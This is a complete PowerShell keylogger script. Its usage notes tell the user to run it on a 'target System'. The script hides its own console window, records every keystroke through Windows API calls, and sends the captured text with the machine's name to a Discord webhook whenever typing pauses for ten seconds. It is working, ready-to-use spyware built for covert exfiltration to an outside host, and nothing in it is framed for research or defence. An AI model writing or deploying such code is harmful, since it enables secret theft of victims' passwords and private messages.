<#


SYNOPSIS
This script gathers Keypress information and posts to a discord webhook address with the results only
when the keyboard is inactive for more than 10 seconds and only if keys were pressed before that.



USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Discord for results

#>

# User Setup
$dc = "WEBHOOK_HERE"

$defs = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru

$lastpress = [System.Diagnostics.Stopwatch]::StartNew()
$threshold = [TimeSpan]::FromSeconds(10)

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'xxx'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xxx' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}


While ($true){
  $ispressed = $false
    try{
      while ($lastpress.Elapsed` -lt $threshold) {
      Sleep -M 30
        for ($character = 8; $character` -le 254; $character++){
        $keyst = $defs::GetAsyncKeyState($character)
          if ($keyst -eq` -32767) {
                $ispressed = $true
                $lastpress.Restart()
                $null = [console]::CapsLock
                $virtual = $defs::MapVirtualKey($character, 3)
                $state = New-Object Byte[] 256
                $check = $defs::GetKeyboardState($state)
                $logged = New-Object -TypeName System.Text.StringBuilder          
            if ($defs::ToUnicode($character, $virtual, $state, $logged, $logged.Capacity, 0)) {
                $thestring = $logged.ToString()
                if ($character` -eq` 13) {$thestring` = "[ENT]"}
                if ($character` -eq` 8) {$thestring` = "[BACK]"}             
                if ($character` -eq` 27) {$thestring` = "[ESC]"}
                $send += $thestring 
            }
          }
        }
      }
    }
    finally{
      If ($ispressed) {
      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
      $send = ""
      $ispressed = $false
      }
    }
  $lastpress.Restart()
  Sleep -M 10
}
